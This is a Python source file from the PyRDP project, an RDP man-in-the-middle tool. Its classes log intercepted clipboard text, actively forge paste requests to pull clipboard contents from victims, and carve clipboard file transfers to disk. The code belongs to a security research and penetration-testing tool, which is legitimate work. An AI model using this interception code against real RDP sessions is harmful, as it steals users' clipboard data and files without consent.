#
# This file is part of the PyRDP project.
# Copyright (C) 2019 GoSecure Inc.
# Licensed under the GPLv3 or later.
#

from logging import LoggerAdapter
from io import BytesIO

from pyrdp.core import decodeUTF16LE, Uint64LE
from pyrdp.enum import ClipboardFormatNumber, ClipboardMessageFlags, ClipboardMessageType, PlayerPDUType, FileContentsFlags
from pyrdp.layer import ClipboardLayer
from pyrdp.logging.StatCounter import StatCounter, STAT
from pyrdp.pdu import ClipboardPDU, FormatDataRequestPDU, FormatDataResponsePDU, FormatListPDU, FileContentsRequestPDU, FileContentsResponsePDU 
from pyrdp.parser.rdp.virtual_channel.clipboard import FileDescriptor
from pyrdp.recording import Recorder



class PassiveClipboardStealer:
    """
    MITM component for the clipboard layer. Logs clipboard data when it is pasted.
    """

    def __init__(self, client: ClipboardLayer, server: ClipboardLayer, log: LoggerAdapter, recorder: Recorder,
                 statCounter: StatCounter):
        """
        :param client: clipboard layer for the client side
        :param server: clipboard layer for the server side
        :param log: logger for this component
        :param recorder: recorder for clipboard data
        """
        self.statCounter = statCounter
        self.client = client
        self.server = server
        self.log = log
        self.recorder = recorder
        self.forwardNextDataResponse = True
        self.files = []
        self.transfers = {}

        self.client.createObserver(
            onPDUReceived = self.onClientPDUReceived,
        )

        self.server.createObserver(
            onPDUReceived = self.onServerPDUReceived,
        )

    def onClientPDUReceived(self, pdu: ClipboardPDU):
        self.statCounter.increment(STAT.CLIPBOARD, STAT.CLIPBOARD_CLIENT)
        self.handlePDU(pdu, self.server)

    def onServerPDUReceived(self, pdu: ClipboardPDU):
        self.statCounter.increment(STAT.CLIPBOARD, STAT.CLIPBOARD_SERVER)
        self.handlePDU(pdu, self.client)

    def handlePDU(self, pdu: ClipboardPDU, destination: ClipboardLayer):
        """
        Check if the PDU is a FormatDataResponse. If so, log and record the clipboard data.
        :param pdu: the PDU that was received
        :param destination: the destination layer
        TODO: Refactor into handler map
        FIXME: Use LOCK and UNLOCK to track file transfer cancellation.
        """

        # Handle file transfers
        if isinstance(pdu, FileContentsRequestPDU):
            if pdu.flags == FileContentsFlags.SIZE:
                # This is a new transfer request.
                if pdu.lindex < len(self.files):
                    fd = self.files[pdu.lindex]
                    self.log.info('Starting transfer for file "%s" Size=%d ClipId=%d', fd.filename, pdu.size, pdu.clipId)

                    if pdu.streamId in self.transfers:
                        self.log.warning('File transfer already started')

                    self.transfers[pdu.streamId] = FileTransfer(fd, pdu.size)
                else:
                    self.log.info('Request for uknown file! (lindex=%d)',  pdu.lindex)

            elif pdu.flags == FileContentsFlags.RANGE:
                if pdu.streamId not in self.transfers:
                    self.log.warning('FileContentsRequest for unknown transfer (streamId=%d)', pdu.streamId)
                else:
                    self.transfers[pdu.streamId].onRequest(pdu)


        elif isinstance(pdu, FileContentsResponsePDU):
            if pdu.streamId not in self.transfers:
                self.log.warning('FileContentsResponse for unknown transfer (streamId=%d)', pdu.streamId)
            else:
                done = self.transfers[pdu.streamId].onResponse(pdu)
                if done:
                    self.log.info('Transfer completed for file "%s"', self.transfers[pdu.streamId].info.filename)
                    del self.transfers[pdu.streamId]

        # Handle regular clipboard.
        if isinstance(pdu, FormatDataResponsePDU):
            if self.forwardNextDataResponse:
                destination.sendPDU(pdu)

            if pdu.msgFlags == ClipboardMessageFlags.CB_RESPONSE_OK:
                # Keep the file list if there is one.
                # FIXME: There is currently no concept of transfer direction.
                if len(pdu.files) > 0:
                    self.files = pdu.files
                    self.log.info('---- Received Clipboard Files ----')
                    for f in self.files:
                        self.log.info(f.filename)
                    self.log.info('-------------------------')

                if pdu.formatId == ClipboardFormatNumber.GENERIC.value:
                    clipboardData = self.decodeClipboardData(pdu.requestedFormatData)
                    self.log.info("Clipboard data: %(clipboardData)r", {"clipboardData": clipboardData})
                    # FIXME: Record all clipboard related messages?
                    self.recorder.record(pdu, PlayerPDUType.CLIPBOARD_DATA)

                if self.forwardNextDataResponse:
                    # Means it's NOT a crafted response
                    self.statCounter.increment(STAT.CLIPBOARD_PASTE)

            self.forwardNextDataResponse = True

        else:  # Unhandled PDU -> forward.
            destination.sendPDU(pdu)

    def decodeClipboardData(self, data: bytes) -> str:
        """
        Decode clipboard bytes to a string.
        :param data: clipboard content bytes
        """
        return decodeUTF16LE(data)


class ActiveClipboardStealer(PassiveClipboardStealer):
    """
    MITM component for the clipboard layer. Actively spies on the clipboard by sending paste requests whenever the
    clipboard is updated.
    """

    def __init__(self, client: ClipboardLayer, server: ClipboardLayer, log: LoggerAdapter, recorder: Recorder,
                 statCounter: StatCounter):
        super().__init__(client, server, log, recorder, statCounter)

    def handlePDU(self, pdu: ClipboardPDU, destination: ClipboardLayer):
        """
        Check if the PDU is a FormatListResponse. If so, send a paste request to steal the clipboard data.
        :param pdu: the PDU that was received
        :param destination: the destination layer
        """
        super().handlePDU(pdu, destination)

        if pdu.msgType == ClipboardMessageType.CB_FORMAT_LIST_RESPONSE:
            self.sendPasteRequest(destination)

    def sendPasteRequest(self, destination: ClipboardLayer):
        """
        Send a FormatDataRequest to request the clipboard data.
        Sets forwardNextDataResponse to False to make sure that this request is not actually transferred to the other end.
        """

        self.statCounter.increment(STAT.CLIPBOARD_COPY)

        formatDataRequestPDU = FormatDataRequestPDU(ClipboardFormatNumber.GENERIC)
        destination.sendPDU(formatDataRequestPDU)
        self.forwardNextDataResponse = False



class FileTransfer:
    """Encapsulate the state of a clipboard file transfer."""
    def __init__(self, info: FileDescriptor, size: int):
        self.info = info
        self.size = size
        self.transferred: int = 0
        self.data = b''
        self.prev = None  # Pending file content requests.

        # TODO: Respect config
        self.handle = open(f'carved-{info.filename}', 'wb')


    def onRequest(self, pdu: FileContentsRequestPDU):
        # TODO: Handle out of order ranges. Are they even possible?
        self.prev = pdu

    def onResponse(self, pdu: FileContentsResponsePDU) -> bool:
        """
        Handle file data.

        @Returns True if file transfer is complete.
        """
        if not self.prev:
            # First response always contains file size.
            self.size = Uint64LE.unpack(BytesIO(pdu.data))

            return False

        received = len(pdu.data)

        self.handle.write(pdu.data)
        self.transferred += received

        if self.transferred == self.size:
            self.handle.close()
            return True

        return False



